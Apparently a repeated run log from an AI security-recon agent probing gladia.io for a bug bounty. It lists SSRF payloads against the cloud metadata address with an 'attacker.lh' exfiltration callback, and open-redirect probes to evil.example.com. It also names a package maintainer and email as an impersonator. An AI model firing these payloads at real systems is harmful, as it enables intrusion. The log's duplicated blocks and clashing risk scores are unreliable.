[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation re-verified fresh 17:0x UTC — sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2` unchanged, dist-tag latest=0.1.3, repo `alexisbouchez/gladia.ts` + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:306–307 appends raw `x-gladia-key` to `wss://api.gladia.io/v2/live` URL query.
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:0x UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate.
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:0x UTC).
[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS `*`; CORS `*` + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 15+ cycles.
[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
[RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + README↔package.json "Official/Unofficial" contradiction; supply-chain risk High.
## 2026-08-08 17:52:20 UTC [app] (model laguna)
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:0x UTC M-bM-^@M-^T form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate.$
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri M-bM-^@M-^T server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:0x UTC).$
[RISK] api.gladia.io: 85 M-bM-^@M-^T Public OpenAPI 14 paths/CORS `*`; CORS `*` + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 15+ cycles.$
[RISK] app.gladia.io: 65 M-bM-^@M-^T /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.$
[RISK] sdk: 85 M-bM-^@M-^T Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + READMEM-bM-^FM-^Tpackage.json "Official/Unofficial" contradiction; supply-chain risk High.$
[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK, leaking API key in WebSocket URL
class: OTHER
asset: npm registry / gladia@0.1.3
confidence: 95
reasoning: Fresh 17:44 UTC probe confirms npm view latest=0.1.3, repository=alexisbouchez/gladia.ts (personal), maintainer=softwarecitadel@gmail.com; GitHub API returns 404 on both user and repo (orphaned); @gladiaio/sdk@1.1.0 points to gladiaio/sdk org (official). src/client.ts:306-307 appends raw x-gladia-key to wss://api.gladia.io/v2/live via searchParams.append, diverging from official SDK POST /v2/live-then-token flow.
evidence_needed: Tarball src/client.ts with searchParams.append of API key into wss URL query; npm metadata showing personal repo; GitHub 404 on user+repo; package.json "Official" vs README "Unofficial"
verify_steps: RAG — tar -xzf gladia-0.1.3.tgz; grep -n 'searchParams.append' package/src/client.ts; npm view gladia repository,maintainers; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/users/alexisbouchez; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/repos/alexisbouchez/gladia.ts
impact: Supply-chain credential theft — devs install impersonated SDK; API keys leak into URL query strings, proxy logs, Referer headers, server-side request logs. severity High.
testability: RAG
[HYP] SSRF via server-side fetch of audio_url/video_url/callback_url on /v2/pre-recorded
class: SSRF
asset: api.gladia.io /v2/pre-recorded
confidence: 73
reasoning: Fresh 17:44 UTC probe confirms POST /v2/pre-recorded (no key) -> 401 NestJS HttpException; /openapi.json (125131B, 14 paths) exposes InitTranscriptionRequest.audio_url, video_url, callback_url, CallbackConfigDto.url all as format:uri with no scheme allowlist; /v1/models (530B, CORS *) leaks FR+US egress regions; key-gated only.
evidence_needed: Server-side fetch reaches 169.254.169.254 (AWS IMDSv1) or localhost/private CIDR; callback_url exfil path confirmed.
verify_steps: AUTH_HELPED — POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.lh/meta"}'
impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
class: OATH
asset: app.gladia.io /signin
confidence: 65
reasoning: Fresh 17:44 UTC probe confirms /signin?redirect_to=https://evil.example.com -> 200, action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" reflection; CSP verified has NO form-action directive (base-uri 'self', object-src 'none', frame-src allowlist); OAuth redirect_uri is FIXED (https://app.gladia.io/auth/google/callback) -> OAuth code/state theft REJECTED; return-to cookie tamper-reset REJECTED. Post-auth honoring is sole unverified gate.
evidence_needed: post-auth 302 Location: https://evil.example.com after completing Google OAuth (or email/password) on /signin?redirect_to=https://evil.example.com
verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth (or email/password) on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie
impact: Post-auth phishing redirect to attacker-controlled host -> brand-spoof after victim authenticates. severity Medium.
testability: HUMAN_ONLY
[PARKED] None
[FINAL]
[NEXT] HUMAN: Phase is POC, target app. With program authorization, complete the Google OAuth (or email/password) flow on https://app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final post-auth 302 Location + Set-Cookie. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe at 17:44 UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow. api/npm surfaces remain NO_DRIFT frozen; api SSRF hypothesis is submission-ready for AUTH_HELPED verification with a valid key in parallel.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 20+ cycles (23:08->17:44 UTC) — openapi 125131B/14 paths, /health {"health":"OK"} 15B, /v1/models 530B FR/US, preflight-only x-powered-by: Express, CORS static * + ACAH x-gladia-key — surface frozen, nothing new to report.
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed fresh 17:44 UTC — sha256 3b23ec7d...7f2 unchanged, dist-tag latest=0.1.3, repo alexisbouchez/gladia.ts + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:307 appends raw x-gladia-key to wss://api.gladia.io/v2/live URL query. | @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG confirmed fresh 17:44 UTC (NO_DRIFT 20th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models 530B FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only, SSRF-by-design persists (AUTH_HELPED).
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:44 UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate. /auth/google/callback returns 200 (OAuth callback path live).
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:44 UTC).
[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS *; CORS * + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 20 cycles.
[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
[RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + README/package.json "Official/Unofficial" contradiction; supply-chain risk High.
[PARKED] None
[FINAL]
[NEXT] HUMAN: Phase is POC, target app. With program authorization, complete the Google OAuth (or email/password) flow on https://app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final post-auth 302 Location + Set-Cookie. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe at 17:44 UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow. api/npm surfaces remain NO_DRIFT frozen; api SSRF hypothesis is submission-ready for AUTH_HELPED verification with a valid key in parallel.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 20+ cycles (23:08->17:44 UTC) — openapi 125131B/14 paths, /health {"health":"OK"} 15B, /v1/models 530B FR/US, preflight-only x-powered-by: Express, CORS static * + ACAH x-gladia-key — surface frozen, nothing new to report.
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed fresh 17:44 UTC — sha256 3b23ec7d...7f2 unchanged, dist-tag latest=0.1.3, repo alexisbouchez/gladia.ts + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:307 appends raw x-gladia-key to wss://api.gladia.io/v2/live URL query. | @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG confirmed fresh 17:44 UTC (NO_DRIFT 20th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models 530B FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only, SSRF-by-design persists (AUTH_HELPED).
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:44 UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate. /auth/google/callback returns 200 (OAuth callback path live).
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:44 UTC).
[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS *; CORS * + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 20 cycles.
[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
[RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + README/package.json "Official/Unofficial" contradiction; supply-chain risk High.
[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK, leaking API key in WebSocket URL
class: OTHER
asset: npm registry / gladia@0.1.3
confidence: 95
reasoning: Fresh 17:44 UTC probe confirms npm view latest=0.1.3, repository=alexisbouchez/gladia.ts (personal), maintainer=softwarecitadel@gmail.com; GitHub API returns 404 on both user and repo (orphaned); @glidaio/sdk@1.1.0 points to gladiaio/sdk org (official). src/client.ts:306–307 appends raw x-gladia-key to wss://api.gladia.io/v2/live via searchParams.append, diverging from official SDK POST /v2/live-then-token flow.
evidence_needed: Tarball src/client.ts with searchParams.append of API key into wss URL query; npm metadata showing personal repo; GitHub 404 on user+repo; package.json "Official" vs README "Unofficial"
verify_steps: RAG — `tar -xzf gladia-0.1.3.tgz; grep -n 'searchParams.append' package/src/client.ts; npm view gladia repository,maintainers; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/users/alexisbouchez; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/repos/alexisbouchez/gladia.ts`
impact: Supply-chain credential theft — devs install impersonated SDK; API keys leak into URL query strings, proxy logs, Referer headers, server-side request logs. severity High.
testability: RAG
[HYP] SSRF via server-side fetch of audio_url/video_url/callback_url on /v2/pre-recorded
class: SSRF
asset: api.gladia.io /v2/pre-recorded
confidence: 73
reasoning: Fresh 17:44 UTC probe confirms POST /v2/pre-recorded (no key) → 401 NestJS HttpException; /openapi.json (125131B, 14 paths) exposes InitTranscriptionRequest.audio_url, video_url, callback_url, CallbackConfigDto.url all as format:uri with no scheme allowlist; /v1/models (530B, CORS *) leaks FR+US egress regions; key-gated only.
evidence_needed: Server-side fetch reaches 169.254.169.254 (AWS IMDSv1) or localhost/private CIDR; callback_url exfil path confirmed.
verify_steps: AUTH_HELPED — `POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.lh/meta"}'`
impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
class: OATH
asset: app.gladia.io /signin
confidence: 65
reasoning: Fresh 17:44 UTC probe confirms /signin?redirect_to=https://evil.example.com → 200, action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" reflection; CSP verified has NO form-action directive (base-uri 'self', object-src 'none', frame-src allowlist); OAuth redirect_uri is FIXED (https://app.gladia.io/auth/google/callback) → OAuth code/state theft REJECTED; return-to cookie tamper-reset REJECTED. Post-auth honoring is sole unverified gate.
evidence_needed: post-auth 302 Location: https://evil.example.com after completing Google OAuth (or email/password) on /signin?redirect_to=https://evil.example.com
verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth (or email/password) on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie
impact: Post-auth phishing redirect to attacker-controlled host → brand-spoof after victim authenticates. severity Medium.
testability: HUMAN_ONLY
[PARKED] None
[FINAL]
[NEXT] HUMAN: Phase is POC, target app. With program authorization, complete the Google OAuth (or email/password) flow on `https://app.gladia.io/signin?redirect_to=https://evil.example.com` and capture the final post-auth `302 Location` + `Set-Cookie`. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe at 17:44 UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow. api/npm surfaces remain NO_DRIFT frozen; api SSRF hypothesis is submission-ready for AUTH_HELPED verification with a valid key in parallel.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 20+ cycles (23:08→17:44 UTC) — openapi 125131B/14 paths, /health `{"health":"OK"}` 15B, /v1/models 530B FR/US, preflight-only x-powered-by: Express, CORS static `*` + ACAH x-gladia-key — surface frozen, nothing new to report.
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation confirmed fresh 17:44 UTC — sha256 `3b23ec7d…7f2` unchanged, dist-tag latest=0.1.3, repo alexisbouchez/gladia.ts + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:307 appends raw x-gladia-key to wss URL query. | @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG confirmed fresh 17:44 UTC (NO_DRIFT 20th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models 530B FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only, SSRF-by-design persists (AUTH_HELPED).
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:44 UTC — form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate. /auth/google/callback returns 200 (OAuth callback path live).
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:44 UTC).
[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS `*`; CORS `*` + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 20 cycles.
[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
[RISK] sdk: 85 — Official @glidiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + README↔package.json "Official/Unofficial" contradiction; supply-chain risk High.
## 2026-08-08 18:17:59 UTC [app] (model laguna)
[PRIO] api.gladia.io, 8.50, attack_surface=9 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=8 freshness=5
[PRIO] npm registry (gladia@0.1.3), 8.25, attack_surface=9 business_value=8 tech_exposure=8 gate_ease=10 cloud_surface=3 freshness=10
[PRIO] app.gladia.io, 6.85, attack_surface=7 business_value=8 tech_exposure=6 gate_ease=6 cloud_surface=6 freshness=7
[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK with API key leakage in WebSocket URL
class: OTHER
asset: npm registry (gladia@0.1.3)
confidence: 95
reasoning: Package claims "Official TypeScript SDK" but source repo alexisbouchez/gladia.ts + user account 404 (orphaned); tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 contains README "Unofficial" vs package.json "Official" contradiction; src/client.ts:307 embeds raw x-gladia-key into wss://api.gladia.io/v2/live?token=<key> query parameter — diverges from official SDK's token-after-init design, leaks key in URLs/logs/proxies
evidence_needed: Document artifact-level findings (tarball hash, README vs package.json contradiction, WS key leakage code path); confirm no affiliation with Gladia
verify_steps: RAG: Finalize report with tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2, README "Unofficial" vs package.json "Official", client.ts:307 key-in-URL; HUMAN: Request Gladia security confirm no affiliation with alexisbouchez/softwarecitadel
impact: Supply chain risk — developers install impersonated SDK leading to credential theft via key-in-URL logs/proxies; severity High
testability: RAG
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io
confidence: 73
reasoning: OpenAPI spec confirms /v2/pre-recorded and /v2/live accept audio_url/video_url/callback_url as format:uri with no scheme allowlist; /v1/models exposes FR/US datacenter regions for egress targeting; NestJS-on-Express backend likely follows redirects; SDK source confirms no host allowlist/metadata-blocklist/redirect-limit validation forwarded to API
evidence_needed: Confirm server-side fetch behavior with internal metadata URLs (169.254.169.254), localhost, private CIDRs; verify redirect following and callback_url SSRF
verify_steps: AUTH_HELPED: POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://169.254.169.254/latest/meta-data/"}'
impact: Cloud metadata access, internal service enumeration, potential data exfiltration via callback; severity High
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on signin form action
class: OATH
asset: app.gladia.io
confidence: 65
reasoning: /signin?redirect_to= reflects value into form action for https://, //, bare-host, confusing-subdomain (app.gladia.io.evil), path-only variants — confirmed live 17:43 UTC; CSP lacks form-action directive restricting POST targets; Google-only OAuth limits exploitability but no host allowlist enforced on reflection at unauthenticated layer; post-auth honoring unverified (AUTH_HELPED)
evidence_needed: Confirm server-side validation of redirect_to against allowlist post-Google-OAuth; test if arbitrary external domains accepted after successful auth
verify_steps: HUMAN: Complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and observe final redirect target
impact: Post-auth open redirect to arbitrary domain; severity Low-Medium (requires user interaction + Google auth)
testability: HUMAN_ONLY
[PARKED] None — all three hypotheses meet confidence ≥40, have concrete verify_steps, and are not on REJECTED list.
[FINAL] 1) Orphaned npm package gladia@0.1.3 impersonates official SDK with API key leakage in WebSocket URL (npm registry, 95, OTHER) 2) SSRF via audio_url/video_url/callback_url server-side fetch (api.gladia.io, 73, SSRF) 3) Post-auth open redirect via reflected redirect_to on signin form action (app.gladia.io, 65, OATH)
[NEXT] HUMAN: Phase is POC, target is app. Complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and observe final redirect target post-auth — sole unverified gate for top app hypothesis.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 16 cycles (23:08→current) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static wildcard — surface frozen
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:43 UTC — form action reflects URL-encoded value; no host allowlist at unauth layer; post-auth honoring sole unverified gate
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed)
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: CSP verified fresh — base-uri 'self', object-src 'none', frame-src allowlist, NO form-action directive; form-action reflection unconstrained (gap confirmed)
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec unchanged (16th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models confirms FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation re-verified fresh 17:0x UTC — sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2` unchanged, dist-tag latest=0.1.3, repo `alexisbouchez/gladia.ts` + user 404 (orphaned), README "Unofficial" vs package.json "Official" contradiction, src/client.ts:306–307 appends raw `x-gladia-key` to `wss://api.gladia.io/v2/live` URL query
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io POST /v2/pre-recorded (+ /video/text/video-transcription, callback_config.url)
confidence: 73
reasoning: spec frozen 17 cycles; URL fields `format:uri` no scheme allowlist; SDK forwards verbatim (sdk-js/sdk-python RAG); /v1/models confirms FR/US egress; key is sole gate (401 NestJS shape confirmed).
evidence_needed: key-gated fetch of 169.254.169.254/internal host reflected in error/status/duration, or callback at internal listener.
verify_steps: AUTH_HELPED — with authorized x-gladia-key POST /v2/pre-recorded {"audio_url":"http://<canary>"} then {"audio_url":"http://169.254.169.254/latest/meta-data/"}; repeat video_url + callback_config.url; run ≥2x for dual-instance egress pool.
impact: cloud-metadata + internal-network read from API origin → High (key-gated)
testability: AUTH_HELPED
[HYP] `gladia`@0.1.3 orphaned impersonation at dist-tag latest
class: OTHER
asset: npm registry `gladia` 0.1.3
confidence: 95
reasoning: dist-tag latest=0.1.3; repo alexisbouchez/gladia.ts + user 404 (orphaned); README "Unofficial" vs package.json "Official" in same artifact; client.ts:307 embeds raw x-gladia-key in wss://.../v2/live?token query.
evidence_needed: none at registry level — artifact contradiction + orphan verified; affiliation verdict pending Gladia.
verify_steps: PASSIVE — done (npm view, tarball sha256 `3b23ec7d…7f2`, GitHub API 404); submission is the only remaining step.
impact: devs run unofficial code with raw API keys in WS URLs (access-log/proxy capture) → Medium impersonation + Medium key hygiene
testability: PASSIVE
[HYP] redirect_to honored post-auth to external host (open redirect)
class: OATH
asset: app.gladia.io /signin
confidence: 55
reasoning: reflection re-confirmed 14:48 UTC; CSP lacks form-action; OAuth redirect_uri injection falsified (fixed callback URI); unsigned return-to cookie resets on tamper.
evidence_needed: post-auth 302 Location to external host after completing SSO with redirect_to set.
verify_steps: AUTH_HELPED — complete Google SSO with ?redirect_to=https://evil.example.com + //evil + app.gladia.io.evil variants; capture post-auth Location + Set-Cookie.
impact: post-auth phishing redirect → Medium (Low-Medium given no Host-header angle remains)
testability: AUTH_HELPED
[NEXT] HUMAN: Submit the `gladia`@0.1.3 report via gladia.io/bug-bounty-report Google Form (tarball sha256 `3b23ec7d…7f2`, shasum `cc96f84a…`, README "Unofficial" vs package.json "Official" contradiction, source repo+account 404 orphaned, client.ts:307 raw x-gladia-key in WS URL query) and in the same submission request an authorized `x-gladia-key` for a self-own-data SSRF canary (http://169.254.169.254/latest/meta-data/); on approval run the canary ≥2x via POST /v2/pre-recorded audio_url/video_url/callback_config.url to cover the FR/US egress pool — this unblocks both the [95] report and the [73] top api finding.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 17 cycles (23:08→17:43 UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential (OPTIONS 204 xpb=Express, GET/POST 401 xpb absent), CORS static wildcard — surface frozen, nothing new to report
[RISK] api.gladia.io: 45 — frozen 14-path key-gated surface with SSRF-by-design fetch fields gated solely by key; drift baseline validated across 17 cycles, no proven exploitable path without a key | app.gladia.io: 33 — unauth redirect_to reflection confirmed, post-auth honoring unproven, redirect_uri injection falsified; no confirmed vuln | sdk: 50 — orphaned `gladia`@0.1.3 at dist-tag latest with raw-API-key-in-WS-URL pattern (report ready); official @gladiaio/sdk@1.1.0 clean, tarball unchanged
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 17:0x UTC M-bM-^@M-^T form action reflects URL-encoded value; CSP lacks form-action directive (gap confirmed); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate.$
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri M-bM-^@M-^T server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed at 17:0x UTC).$
[RISK] api.gladia.io: 85 M-bM-^@M-^T Public OpenAPI 14 paths/CORS `*`; CORS `*` + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 15+ cycles.$
[RISK] app.gladia.io: 65 M-bM-^@M-^T /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.$
[RISK] sdk: 85 M-bM-^@M-^T Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + READMEM-bM-^FM-^Tpackage.json "Official/Unofficial" contradiction; supply-chain risk High.$
[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK, leaking API key in WebSocket URL
class: OTHER
asset: npm registry / gladia@0.1.3
confidence: 95
reasoning: Fresh 17:44 UTC probe confirms npm view latest=0.1.3, repository=alexisbouchez/gladia.ts (personal), maintainer=softwarecitadel@gmail.com; GitHub API returns 404 on both user and repo (orphaned); @gladiaio/sdk@1.1.0 points to gladiaio/sdk org (official). src/client.ts:306-307 appends raw x-gladia-key to wss://api.gladia.io/v2/live via searchParams.append, diverging from official SDK POST /v2/live-then-token flow.
evidence_needed: Tarball src/client.ts with searchParams.append of API key into wss URL query; npm metadata showing personal repo; GitHub 404 on user+repo; package.json "Official" vs README "Unofficial"
verify_steps: RAG — tar -xzf gladia-0.1.3.tgz; grep -n 'searchParams.append' package/src/client.ts; npm view gladia repository,maintainers; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/users/alexisbouchez; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/repos/alexisbouchez/gladia.ts
impact: Supply-chain credential theft — devs install impersonated SDK; API keys leak into URL query strings, proxy logs, Referer headers, server-side request logs. severity High.
testability: RAG
[HYP] SSRF via server-side fetch of audio_url/video_url/callback_url on /v2/pre-recorded
class: SSRF
asset: api.gladia.io /v2/pre-recorded
confidence: 73
